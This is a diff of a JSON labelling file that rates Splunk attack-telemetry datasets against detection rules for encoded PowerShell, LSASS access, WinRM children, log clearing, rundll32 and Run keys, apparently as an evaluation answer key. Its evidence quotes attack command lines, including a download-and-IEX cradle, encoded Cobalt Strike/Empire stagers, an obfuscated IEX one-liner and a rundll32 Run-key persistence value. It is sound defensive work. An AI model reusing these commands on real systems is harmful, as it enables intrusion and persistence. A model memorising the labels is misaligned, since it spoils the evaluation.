+      "EventRecordID 42661953: Sysmon 13 SetValue, Image powershell.exe, TargetObject HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Configuration\\EnableAt, Details DWORD (0x00000001), user ATTACKRANGE\\Administrator",
+      "EventRecordID 45155241: Sysmon 13 SetValue, same value, Image powershell.exe, user MSWIN-SERVER\\Administrator",
+      "File holds only Sysmon 13 (2 events); no Sysmon 1 or 4688"
+     ],
+     "reason": "The PowerShell activity of the test is visible only as a registry write. The detection reads process creation (Sysmon 1 or 4688 command lines), which the file does not contain, so it cannot tell whether an encoded command was used. Other rules: EnableAt is not a Run key (T1547.001), and no schtasks or ScheduledTasks cmdlet is involved (T1053.005)."
+    }
+   ]
+  },
+  {
+   "label": "H19",
+   "dataset": "splunk/T1059.001/atomic_red_team/windows-sysmon",
+   "sha256": "8f71b2a0ef81892551cd6a9ad115b8ec5c42d9f2071547b064c496511898c4e9",
+   "summary": "Invoke-AtomicTest T1059.001 run several times on three DCs: Mimikatz/BloodHound/AppPathBypass/MsXml/XML download cradles, mshta javascript:, fileless registry script, PS v2, NTFS ADS, New-PSSession, and the ATH Out-ATHPowerShellCommandLineParameter encoded-command variations (-E ... -EncodedCommand, also with / prefixes) launched through WMI and PowerShell. On win-dc-725, a PowerShell process with mimikatz DLL loads opens LSASS with 0x1010.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 1697969: Sysmon 1, powershell.exe -NoProfile -E <base64, 128 chars>, parent WmiPrvSE.exe (ATH -EncodedCommand variation)",
+      "EventRecordID 2235118: Sysmon 1, powershell.exe -NoProfile -EC <base64, 128 chars>, parent powershell.exe",
+      "EventRecordID 2238114: Sysmon 1, powershell.exe /NoProfile /EC <base64, 128 chars>, parent WmiPrvSE.exe ('/' prefix)",
+      "EventRecordID 2237829: Sysmon 1, powershell.exe -NoProfile -EncodedCommand <base64, 128 chars>, parent WmiPrvSE.exe",
+      "EventRecordID 1698130: Sysmon 1, powershell.exe -NoProfile -EncodedArguments <base64, 784 chars> -E <base64, 52 chars>, parent WmiPrvSE.exe",
+      "62 ATH-spawned PowerShell process creations match in total (47 under WmiPrvSE.exe, 15 under powershell.exe); payloads decode to a Write-Host marker",
+      "Harness: EventRecordID 1698075, the Invoke-AtomicTest launcher powershell.exe & {Out-ATHPowerShellCommandLineParameter ... -EncodedArgumentsParamVariation EncodedArguments ...}, also fits the documented regex because 'EncodedArguments' is 16 Base64-alphabet characters"
+     ],
+     "reason": "The ATH tests are the test tooling performing the technique: real PowerShell processes with encoded commands in every documented prefix form, matched by image and regex as described in How the detection works. No parent filter (filter_sccm) applies. The Invoke-AtomicTest launcher at 1698075 is harness activity in the regex's scope, mentioned for completeness."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 35049: Sysmon 10, SourceImage C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, TargetImage C:\\Windows\\system32\\lsass.exe, GrantedAccess 0x1010, CallTrace ntdll.dll+a6084|KERNELBASE.dll+221bd|UNKNOWN(000001D526126BC7), host win-dc-725",
+      "EventRecordIDs 35042-35048: Sysmon 7, the same powershell.exe loads samlib.dll, cryptdll.dll, vaultcli.dll, WinSCard.dll, hid.dll (mimikatz load set) just before the access",
+      "Not in scope: 78 x wmiprvse.exe 0x1410 (WMI provider host filter by full path), 12 x svchost.exe 0x1400 (no PROCESS_VM_READ)"
+     ],
+     "reason": "PROCESS_VM_READ plus query rights on LSASS from powershell.exe with an UNKNOWN (reflectively loaded) frame. This is the Invoke-Mimikatz case the README says the rule catches, and the PowerShell filter needs 0x1410 with a System.ni.dll frame, so it does not apply."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 1697483: Sysmon 1, powershell.exe & {New-PSSession -ComputerName $env:COMPUTERNAME ... (ART 'PowerShell Session Creation and Use')",
+      "EventRecordID 1697509: Sysmon 1, wsmprovhost.exe -Embedding, parent svchost.exe",
+      "No Sysmon 1 event in the file has ParentImage wsmprovhost.exe or winrshost.exe"
+     ],
+     "reason": "A PowerShell remoting session was opened but started no process. The README lists 'Cmdlet-only sessions - commands that stay inside PowerShell start no child process' as a gap. The ATH children launched through WmiPrvSE.exe are local WMI execution, which the README also leaves to other rules."
+    }
+   ]
+  },
+  {
+   "label": "H20",
+   "dataset": "splunk/T1059.001/msix_powershell/windows-sysmon",
+   "sha256": "3f349b90eead3e2eda89bcc776b5f250f1ece2bd1a2c9d128ca79ad087d72e93",
+   "summary": "Three Sysmon 1 events (synthetic-looking record IDs and hashes): PowerShell started from MSIX package stubs (AiStubX64Elevated.exe, AiStubX86.exe) and from cmd.exe to run .ps1 files under C:\\Program Files\\WindowsApps with -ExecutionPolicy Bypass / -WindowStyle Hidden.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 123456: Sysmon 1, powershell.exe -ExecutionPolicy Bypass -File \"C:\\Program Files\\WindowsApps\\MaliciousApp_1.0.0.0_x64__...\\Scripts\\setup.ps1\", parent AiStubX64Elevated.exe",
+      "EventRecordID 123457: Sysmon 1, powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -file \"...\\FakeInstaller_...\\payload.ps1\", parent AiStubX86.exe",
+      "EventRecordID 123458: Sysmon 1, powershell.exe -WindowStyle Hidden C:\\Program Files\\WindowsApps\\MaliciousToolkit_...\\config.ps1 -action download ..., parent cmd.exe"
+     ],
+     "reason": "Malicious PowerShell script execution with no encoded-command parameter. The README states that -ExecutionPolicy / -ep do not trigger the rule, so this is outside the documented scope."
+    }
+   ]
+  },
+  {
+   "label": "H21",
+   "dataset": "splunk/T1059.001/obfuscated_powershell/windows-sysmon",
+   "sha256": "70d3c6982eb05a2897b9e4adcba25da2a5f1fbfbf07eca373cf4ca0c063f56a3",
+   "summary": "A DC lab session: Ansible over WinRM (winrshost -> cmd -> PowerShell -EncodedCommand bootstrap, exec_wrapper, win_reboot and its whoami check), CALDERA agents and EC2/Firefox/IE noise. The recorded attack is one manual Invoke-Obfuscation command: string concatenation plus .Replace piped to iex, run as a plain PowerShell argument from cmd.exe.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 77: Sysmon 1, powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent cmd.exe (Ansible WinRM bootstrap)",
+      "EventRecordID 97: Sysmon 1, powershell.exe ... -EncodedCommand <base64, 928 chars>, parent powershell.exe (decodes to Ansible exec_wrapper)",
+      "EventRecordID 2972: Sysmon 1, PowerShell ... -EncodedCommand <base64, 16 chars> (decodes to 'whoami', the Ansible win_reboot test command)",
+      "13 in-scope PowerShell process creations, all Ansible",
+      "Attack, not in scope: EventRecordID 28476, Sysmon 1, powershell.exe \"('Wri'+'te-Host '+'aAgHello, '+'World!'+'aAg').RePlAcE('aAg',[stRINg][cHaR]39) | ieX\", parent cmd.exe"
+     ],
+     "reason": "The only encoded commands are the Ansible WinRM wrappers. Lab automation is in scope and no documented filter covers it, so an alert is expected but carries no attack evidence. The Invoke-Obfuscation command is non-encoded concatenation plus IEX, a documented gap ('Obfuscation inside a non-encoded command')."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 64: Sysmon 1, Image cmd.exe (OriginalFileName Cmd.Exe), CommandLine cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent winrshost.exe",
+      "9 cmd.exe children of winrshost.exe in total (e.g. EventRecordIDs 190, 317, 445, 2959), all Ansible"
+     ],
+     "reason": "cmd.exe under winrshost.exe matches susp_shell. These children are Ansible's WinRM shell (lab automation), not the attack, which never used WinRM."
+    }
+   ]
+  },
+  {
+   "label": "H22",
+   "dataset": "splunk/T1059.001/powershell_execution_policy/windows-sysmon",
+   "sha256": "7854054b5fa788e7c430b7045ddbebb09be43300d2b0b2478cb893e70aaaca41",
+   "summary": "Same lab build as H21: Ansible over WinRM, CALDERA agents and boot noise. The recorded attack sets the PowerShell execution policy to Bypass by editing HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell\\ExecutionPolicy in the regedit GUI.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 73: Sysmon 1, powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent cmd.exe (Ansible WinRM bootstrap)",
+      "EventRecordID 93: Sysmon 1, powershell.exe ... -EncodedCommand <base64, 928 chars>, parent powershell.exe (Ansible exec_wrapper)",
+      "12 in-scope PowerShell process creations, all Ansible (bootstrap, exec_wrapper, win_reboot, whoami at EventRecordID 2869)",
+      "Attack, not in scope: EventRecordID 7643, Sysmon 13 SetValue by C:\\Windows\\regedit.exe, TargetObject ...\\ShellIds\\Microsoft.PowerShell\\ExecutionPolicy, Details Bypass (regedit started at EventRecordID 7137)"
+     ],
+     "reason": "Encoded commands come only from Ansible lab automation, which is in scope and unfiltered, so an alert is expected without attack evidence. The attack is a GUI registry edit with no PowerShell command line, outside the rule's process-creation scope."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 60: Sysmon 1, Image cmd.exe (OriginalFileName Cmd.Exe), CommandLine cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent winrshost.exe",
+      "8 cmd.exe children of winrshost.exe in total (e.g. EventRecordIDs 186, 313, 441, 2856), all Ansible"
+     ],
+     "reason": "susp_shell under winrshost.exe, produced by Ansible's WinRM connection (lab automation). The attack did not use WinRM."
+    }
+   ]
+  },
+  {
+   "label": "H23",
+   "dataset": "splunk/T1059.001/powershell_remotesigned/remotesigned_sysmon",
+   "sha256": "a47baee10e74c0f675a26a9f3153a35109938a6570b9b75cb5047be03eea78c5",
+   "summary": "One Sysmon 1 event: cmd.exe in C:\\Temp starts PowerShell -ExecutionPolicy remotesigned -File .\\mal.ps1.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 14039: Sysmon 1, Image powershell.exe (OriginalFileName PowerShell.EXE), CommandLine PowerShell  -ExecutionPolicy remotesigned -File .\\mal.ps1, parent cmd.exe /s /k pushd \"C:\\Temp\""
+     ],
+     "reason": "Malicious script run through PowerShell with no encoded-command parameter. The README states that -ExecutionPolicy does not trigger the rule, so this is outside the documented scope."
+    }
+   ]
+  },
+  {
+   "label": "H24",
+   "dataset": "splunk/T1059.001/powershell_script_block_logging/windows-sysmon",
+   "sha256": "04daf83b69e4b798e21f74fde0dc68d9de1732f139ce4a4463fcaa36d4995589",
+   "summary": "Manual and Atomic Red Team PowerShell activity on a DC: ART T1059.001 cradles and AD discovery (dsquery, nltest, AdFind, PowerView), plus Cobalt Strike and Empire HTA files opened from the desktop. The HTAs make mshta.exe start PowerShell stagers with -encodedcommand/-enc, and a later PowerShell starts another encoded stager.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 2692675: Sysmon 1, C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -encodedcommand <base64, 7320 chars>, parent SysWOW64\\mshta.exe (evilcs.hta)",
+      "EventRecordID 2692724: Sysmon 1, SysWOW64 powershell.exe -noP -sta -w 1 -enc <base64, 5120 chars>, parent SysWOW64\\mshta.exe (empire.hta)",
+      "EventRecordID 2695070: Sysmon 1, powershell.exe -nop -w hidden -encodedcommand <base64, 7372 chars>, parent powershell.exe"
+     ],
+     "reason": "Attack stagers launched as PowerShell processes with -encodedcommand / -enc and a Base64 blob, which is exactly the documented regex on a PowerShell image. The parents (mshta.exe, powershell.exe) are not covered by any documented filter."
+    }
+   ]
+  },
+  {
+   "label": "H25",
+   "dataset": "splunk/T1059.001/powershell_xml_requests/windows-sysmon",
+   "sha256": "c9c7f3a36611ed52e40b4f29440a45a07f1aac601a340f5ee4bf07fe5afa97b8",
+   "summary": "Atomic test T1059.001-8 (PowerShell XML requests) run through Invoke-AtomicTest, which Ansible drives over WinRM (bootstrap, exec_wrapper, win_shell -encodedcommand wrappers, win_reboot). The test itself is cmd /c powershell -exec bypass -noprofile with an XmlDocument.Load ... | IEX one-liner.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 79: Sysmon 1, powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent cmd.exe (Ansible WinRM bootstrap)",
+      "EventRecordID 4031: Sysmon 1, \"powershell.exe\" -noninteractive -encodedcommand <base64, 608 chars>, parent powershell.exe (Ansible win_shell wrapper that calls Invoke-AtomicTest)",
+      "37 in-scope PowerShell process creations, all Ansible wrappers or Invoke-AtomicTest harness",
+      "Attack, not in scope: EventRecordID 4357, Sysmon 1, powershell.exe -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubuserc...\" ... | IEX, parent cmd.exe"
+     ],
+     "reason": "Every encoded command is lab automation or test harness: in scope and unfiltered, so an alert is expected without attack evidence. The atomic test is a non-encoded IEX one-liner, a documented gap ('Obfuscation inside a non-encoded command (IEX, ...)')."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
+      "EventRecordID 63: Sysmon 1, Image cmd.exe (OriginalFileName Cmd.Exe), CommandLine cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 2700 chars>, parent winrshost.exe",
+      "18 cmd.exe children of winrshost.exe in total (e.g. EventRecordIDs 189, 315, 441, 2779), all Ansible"
+     ],
+     "reason": "susp_shell under winrshost.exe, produced by Ansible's WinRM shell that drives Invoke-AtomicTest (lab automation). The atomic test ran locally and did not use WinRM."
+    }
+   ]
+  },
+  {
+   "label": "H26",
+   "dataset": "splunk/T1059.001/sharphound/windows-sysmon",
+   "sha256": "29f4f1a561c219f2fe98db0e1269417a7632804c1431a9f1fadfccfba4f170c0",
+   "summary": "Manual SharpHound and AzureHound testing on a DC: powershell.exe import-module SharpHound.ps1 / AzureHound.ps1 through cmd.exe, SharpHound.exe -c all, and a renamed copy (notsharph.exe, OriginalFileName SharpHound.exe).",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 648984: Sysmon 1, powershell.exe  import-module c:\\temp\\SharpHound.ps1, parent cmd.exe",
+      "EventRecordID 650695: Sysmon 1, powershell.exe  import-module c:\\temp\\AzureHound.ps1, parent cmd.exe",
+      "EventRecordID 649806: Sysmon 1, C:\\Temp\\SharpHound.exe --CollectionMethod all; EventRecordID 650035: C:\\Temp\\notsharph.exe (OriginalFileName SharpHound.exe)",
+      "No encoded-command parameter on any PowerShell command line in the file"
+     ],
+     "reason": "The attack runs PowerShell in plain text (import-module / Invoke-AzureHound) and as a .NET collector binary. Neither has an encoded-command parameter, so both are outside the documented scope."
+    }
+   ]
+  },
+  {
+   "label": "H27",
+   "dataset": "splunk/T1059.001/soaphound/sysmon_soaphound",
+   "sha256": "99d01ead83b5a6d435c25fc101a1886a698ca0880c8da769d6914bbd23a475cc",
+   "summary": "SOAPHound (AD collection over ADWS) run manually from the desktop and through Atomic Red Team, from powershell.exe via cmd.exe /c with lab credentials on the command line. Several runs crash into WerFault.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 246647: Sysmon 1, cmd.exe /c C:\\AtomicRedTeam\\atomics\\T1059.001\\src\\SOAPHound.exe --user administrator@attackrange.local --password <redacted> ..., parent powershell.exe",
+      "EventRecordID 245717: Sysmon 1, C:\\Users\\Administrator\\Desktop\\SOAPHound.exe --user ... --password <redacted> ..., parent powershell.exe",
+      "No PowerShell process creation with an encoded command in the file (PowerShell appears only as a parent)"
+     ],
+     "reason": "The T1059.001-tagged test runs a .NET binary from a PowerShell host with no encoded-command parameter, so it is outside the documented scope (a PowerShell image with an encoded command)."
+    }
+   ]
+  },
+  {
+   "label": "H28",
+   "dataset": "splunk/T1059.001/trickbot_cmd_powershell/windows-sysmon",
+   "sha256": "7ba1d02c6b44d877cfef9f4c690515ae04edb2347581ea93bb9657cb864aeec7",
+   "summary": "TrickBot running injected in wermgr.exe: it spawns cmd.exe shells, a dropped %TEMP%\\WSE1B72.exe, and cmd.exe /c powershell -nop -w hidden -encodedcommand <payload>. Each record appears twice. Only wermgr.exe children are recorded.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 195808 (ordinals 1-2, duplicated): Sysmon 1, Image cmd.exe (OriginalFileName Cmd.Exe), CommandLine /c powershell -nop -w hidden -encodedcommand <base64, 7456 chars>, parent wermgr.exe",
+      "No Sysmon 1 event for the powershell.exe child in the file (the 16 events are all wermgr.exe children: cmd.exe and WSE1B72.exe)"
+     ],
+     "reason": "The attack ran encoded PowerShell, but the file records only the cmd.exe parent. The rule matches the PowerShell process itself (powershell.exe/pwsh.exe by path or OriginalFileName, the 'renamed-binary branch'), and the powershell.exe creation event it reads is missing from the recording."
+    }
+   ]
+  },
+  {
+   "label": "H29",
+   "dataset": "splunk/T1059.001/unmanaged_powershell_execution/windows-sysmon",
+   "sha256": "e7905b25fc39c794cf37e7c6ddfab273dc3f4ce61786556f9e61bd0bcc57300a",
+   "summary": "58 Sysmon 7 image loads from NimPlant.exe (C2 implant in the user's Downloads) hosting unmanaged PowerShell: clr.dll, amsi.dll, System.Management.Automation.ni.dll and Microsoft.PowerShell.* native images.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 55318563: Sysmon 7, Image C:\\Users\\reed_larsen\\Downloads\\NimPlant.exe, ImageLoaded ...\\System.Management.Automation.ni.dll",
+      "EventRecordIDs 55318423 / 55318370: Sysmon 7, NimPlant.exe loads clr.dll and amsi.dll; EventRecordID 55318804: Microsoft.PowerShell.ConsoleHost.ni.dll",
+      "File holds only Sysmon 7; no powershell.exe process creation"
+     ],
+     "reason": "PowerShell hosted inside a custom binary is listed under Evasion & coverage gaps ('PowerShell hosted in another process (System.Management.Automation.dll loaded by a custom binary - Sysmon EID 7)'). No PowerShell process or command line exists for the rule to read."
+    }
+   ]
+  },
+  {
+   "label": "H30",
+   "dataset": "splunk/T1059.004/linux_netcat_outbound_connection/snapattack_linux",
+   "sha256": "0b1c6400747eb6d1026980823e7f4eaa7890584bd3200f5bc9e25f210ce275f5",
+   "summary": "Sysmon for Linux network connection (EID 3, one record exported twice): root's /usr/bin/ncat on ip-10-0-76-137 connects out to 10.0.76.44:4444 (netcat reverse-shell style). No process-creation events.",
+   "labels": [
+    {
+     "detection": "T1059.004_linux_suspicious_shell_execution",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 1068124 (ord 1 and 2, duplicate): Linux-Sysmon 3, Image /usr/bin/ncat, User root, tcp 10.0.76.137:53976 -> 10.0.76.44:4444, Initiated true",
+      "No Sysmon for Linux EID 1 in the file"
+     ],
+     "reason": "The rule reads Sysmon for Linux EID 1 command lines, which are absent, so the command that started the netcat session cannot be checked. Note: the visible ncat binary is in /usr/bin (not /tmp, /var/tmp, /dev/shm), so the netcat process itself would not meet susp_tmp_binary; only a launching command that piped decoded Base64 into a shell would be in scope."
+    }
+   ]
+  },
+  {
+   "label": "H31",
+   "dataset": "splunk/T1070.001/suspicious_event_log_service_behavior/windows-xml",
+   "sha256": "2e21a593c8d04de1db696bec2e9842360b69ee72ea97e2063a67888e83e8159c",
+   "summary": "15 Security 1100 records (\"The event logging service has shut down\") from five Attack Range hosts, almost all on 2024-04-08 between 18:11 and 18:48, with pairs 24-39 s apart on the same host. No clear events (1102/104) and no process events. 1100 is also written on every normal shutdown.",
+   "labels": [
+    {
+     "detection": "T1070.001_security_log_cleared",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 140874: Security 1100 (provider Microsoft-Windows-Eventlog, \"event logging service has shut down\"), host ar-win-2, 2024-04-08T18:48:10Z",
+      "EventRecordIDs 138978 and 139411: Security 1100 on EC2AMAZ-EELNTI1 at 18:37:06Z and 18:37:42Z (service down twice in 36 s); 15 x 1100 across 5 hosts",
+      "No Security 1102 in the file"
+     ],
+     "reason": "The recorded behaviour is the EventLog service stopping, not a clear; the README lists \"Stopping the EventLog service or tampering with forwarding before clearing\" as a gap to cover with log-volume heartbeat monitoring."
+    },
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 140874: Security 1100 (provider Microsoft-Windows-Eventlog, \"event logging service has shut down\"), host ar-win-2, 2024-04-08T18:48:10Z",
+      "EventRecordIDs 138978 and 139411: Security 1100 on EC2AMAZ-EELNTI1 at 18:37:06Z and 18:37:42Z (service down twice in 36 s); 15 x 1100 across 5 hosts",
+      "No System 104 in the file"
+     ],
+     "reason": "Same documented gap: stopping the EventLog service writes no 104; the README sends it to heartbeat (log-volume gap) monitoring."
+    },
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 140874: Security 1100 (provider Microsoft-Windows-Eventlog, \"event logging service has shut down\"), host ar-win-2, 2024-04-08T18:48:10Z",
+      "EventRecordIDs 138978 and 139411: Security 1100 on EC2AMAZ-EELNTI1 at 18:37:06Z and 18:37:42Z (service down twice in 36 s); 15 x 1100 across 5 hosts",
+      "No Sysmon 1 / Security 4688 in the file"
+     ],
+     "reason": "Stopping the logging service is log tampering, not one of the covered clearing commands (wevtutil cl, Clear-/Remove-/Limit-EventLog, ClearLog, WMI ClearEventLog); the README puts log tampering under \"detect via gaps in log volume instead\"."
+    }
+   ]
+  },
+  {
+   "label": "H32",
+   "dataset": "splunk/T1070.001/suspicious_kerberos_service_ticket_request/windows-xml",
+   "sha256": "b5accc7e16fb3cda3fe214b45a801420d897b4568298e34adc51e6d7490c0012",
+   "summary": "Single Security 4769 on ar-win-dc: AR-WIN-2$ requests a service ticket for its own machine account (ServiceName AR-WIN-2$), encryption 0x12 (AES256), status 0x0, from ::ffff:10.0.1.15. Ordinary machine-account behaviour, not Kerberoasting: both Kerberos rules read 4769 but exclude computer-account services ($), the RC4 rule also needs 0x17 and the volume rule 5+ services. The T1070.001 folder is an automatic categorisation; there is no log-clearing activity. No detection applies.",
+   "labels": []
+  },
+  {
+   "label": "H33",
+   "dataset": "splunk/T1218.011/random_dll_extension/random_dll_rundll32.log",
+   "sha256": "fcab984bb700abbd3fd27a150cbd70b907f608ea177c3487cb04796946f2e614",
+   "summary": "rundll32.exe started four times from an elevated PowerShell in C:\\sdwl, loading a DLL with a random extension by relative path (.\\abcds.dba) and calling the MessageBoxThread, DllMain and RAFlush exports.",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 71539: Sysmon 1, C:\\Windows\\System32\\rundll32.exe \\\".\\abcds.dba,MessageBoxThread\\\", CurrentDirectory C:\\sdwl\\, parent powershell.exe -noexit -command Set-Location -literalPath 'C:\\sdwl'",
+      "EventRecordIDs 71540 (,DllMain), 71548 (,RAFlush), 71555 (,MessageBoxThread): same DLL and parent"
+     ],
+     "reason": "None of the four selections applies: no javascript:/RunHTMLApplication, the DLL is not in AppData/ProgramData/Users\\Public/Windows\\Temp/Downloads (relative path in C:\\sdwl), no comsvcs MiniDump, and arguments are present. Random DLL extensions in arbitrary folders are outside the documented scope."
+    }
+   ]
+  },
+  {
+   "label": "H34",
+   "dataset": "splunk/T1218.011/rundll32_random_dll_ext/rundll32_random_ext.log",
+   "sha256": "35ff5c023ba0d709145e91fb3623b3563e094fa065c3e5b181b11a0504212d45",
+   "summary": "gh0st RAT sample on EC2AMAZ-UGL8NO0: a dropper in %TEMP% (vequmgb.exe, started with Downloads\\gh0strat_dump_SCY.exe) runs SysWOW64 rundll32 on c:\\qhccl\\xmfav.max,RAFlush (Security 4688 + Sysmon 1), and rundll32 then writes HKU ...\\CurrentVersion\\Run\\EvtMgr pointing to the same rundll32 command (Sysmon 13).",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 5558: Sysmon 1, C:\\Windows\\SysWOW64\\rundll32.exe \"\\\"c:\\qhccl\\xmfav.max\\\",RAFlush C:\\Users\\user\\AppData\\Local\\Temp\\2\\vequmgb.exe\", parent C:\\Users\\user\\AppData\\Local\\Temp\\2\\vequmgb.exe",
+      "EventRecordID 185925: Security 4688, same command line and parent"
+     ],
+     "reason": "Malware proxy execution, but the DLL is loaded from c:\\qhccl (random root folder, .max extension), not from a susp_path location. The only AppData path is an argument passed to the export (the dropper's own path), and the parent location is not a selection. Outside the documented patterns; an implementation that matches \\AppData\\ anywhere in the command line would still fire on the argument."
+    },
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 5628: Sysmon 13, c:\\windows\\SysWOW64\\rundll32.exe sets HKU\\S-1-5-21-...-1008\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EvtMgr = c:\\windows\\SysWOW64\\rundll32.exe \"c:\\qhccl\\xmfav.max\",RAFlush"
+     ],
+     "reason": "A Run value is written, but its data points to rundll32 (a LOLBin, not a script interpreter) loading a DLL from c:\\qhccl, not to one of the user-writable locations the rule looks for (AppData and the like); outside the documented data condition."
+    }
+   ]
+  },
+  {
+   "label": "H35",
+   "dataset": "splunk/T1218.011/snapattack/snapattack",
+   "sha256": "b863e5f3e63c90061ad8c74d4a6c009cc203bf227b70711a00d634484f4ad5df",
+   "summary": "SnapAttack mix of rundll32/DLL samples: Atomic syssetup.dll SetupInfObjectInstallAction running an INF from AppData\\Roaming (4688, EC2AMAZ-NNKUICG), rundll32 loading C:\\Users\\Public\\Documents\\wmipdpa.dll as SYSTEM from PowerShell (Sysmon 1, SLABS-DC), and dwm.exe writing/loading unsigned DLLs in C:\\Users\\Public\\Documents (Sysmon 11/7, duplicated).",
+   "labels": [
+    {
+     "detection": "T1218.011_rundll32_suspicious_execution",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 1643: Sysmon 1, C:\\Windows\\System32\\rundll32.exe \"C:\\Users\\Public\\Documents\\wmipdpa.dll ControlTrace -Embedding -k DcomLaunch\", parent powershell.exe, User NT AUTHORITY\\SYSTEM, host SLABS-DC",
+      "EventRecordID 109916: Security 4688, rundll32.exe \"syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\C:\\Users\\user\\AppData\\Roaming\\...\\T1218.011_DefaultInstall.inf\", parent cmd.exe"
+     ],
+     "reason": "RID 1643 loads a DLL from C:\\Users\\Public (susp_path) and no filter applies. RID 109916 loads syssetup.dll from System32 with the INF in AppData passed as an argument, which by the \"DLL loaded from\" wording is not itself in scope."
+    }
+   ]
+  },
+  {
+   "label": "H36",
+   "dataset": "splunk/T1547.001/atomic_red_team/bootexecute-windows-sysmon",
+   "sha256": "250282b2b0ccfe81a2d40f2fd21ccdaeba15d1b17f46ba102f9fd67f61d6b284",
+   "summary": "Atomic Red Team T1547.001 BootExecute test on mswin-server: 20 Sysmon 13 writes to HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\BootExecute (Details \"Binary Data\") by reg.exe (17) and powershell.exe (3) between 2023-05-03 and 2023-05-05. No Run/RunOnce writes despite the description.",
+   "labels": [
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "blind-spot",
+     "evidence": [
+      "EventRecordID 123167134: Sysmon 13, powershell.exe sets HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\BootExecute = Binary Data",
+      "EventRecordID 127989020: Sysmon 13, reg.exe sets ...\\Session Manager\\BootExecute; all 20 records are this value"
+     ],
+     "reason": "BootExecute is an autostart location other than CurrentVersion\\Run/RunOnce; the README gap \"Other autostart locations ... Each deserves its own rule\" covers it (BootExecute is not named in that example list)."
+    }
+   ]
+  },
+  {
+   "label": "H37",
+   "dataset": "splunk/T1547.001/snapattack/snapattack",
+   "sha256": "1ca1e343e12e99abb1381e180cc0b191dc53ef37786973b2fa4b65bcb893fa84",
+   "summary": "POWERSTATS (MuddyWater) persistence emulation on win10-base: wmiprvse.exe writes HKU ...\\CurrentVersion\\Run\\WindowsDefenderUpdater = rundll32 advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,.",
+   "labels": [
+    {
+     "detection": "T1547.001_registry_run_key_persistence",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 10577: Sysmon 13, C:\\WINDOWS\\sysWOW64\\wbem\\wmiprvse.exe sets HKU\\S-1-5-21-...-1002\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdater = c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,..."
+     ],
